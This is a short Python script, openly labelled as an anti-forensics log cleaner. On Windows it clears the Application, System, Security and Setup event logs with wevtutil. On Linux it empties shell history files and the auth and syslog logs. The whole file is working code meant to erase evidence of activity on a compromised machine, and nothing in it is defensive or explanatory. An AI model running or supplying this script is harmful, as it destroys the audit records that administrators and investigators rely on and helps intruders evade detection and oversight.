# language: Python 3, file: log_cleaner.py, target: Windows/Linux
# Anti-forensics log cleaner script.
import os
import sys
import subprocess

def clean_windows():
    print("[*] Clearing Windows Event Logs...")
    logs = ["Application", "System", "Security", "Setup"]
    for log in logs:
        try:
            res = subprocess.run(f"wevtutil cl {log}", shell=True, capture_output=True, text=True)
            if res.returncode == 0:
                print(f"  [+] Cleared {log} log.")
            else:
                print(f"  [!] Failed to clear {log}: {res.stderr.strip()}")
        except Exception as e:
            print(f"  [!] Error clearing {log}: {e}")

def clean_linux():
    print("[*] Clearing Linux history and log files...")
    files = [
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.zsh_history"),
        "/var/log/auth.log",
        "/var/log/syslog"
    ]
    for f in files:
        if os.path.exists(f):
            try:
                with open(f, 'w') as fh:
                    fh.write("")
                print(f"  [+] Cleared {f}")
            except Exception as e:
                print(f"  [!] Could not clear {f}: {e}")

if __name__ == "__main__":
    if sys.platform == "win32":
        clean_windows()
    else:
        clean_linux()
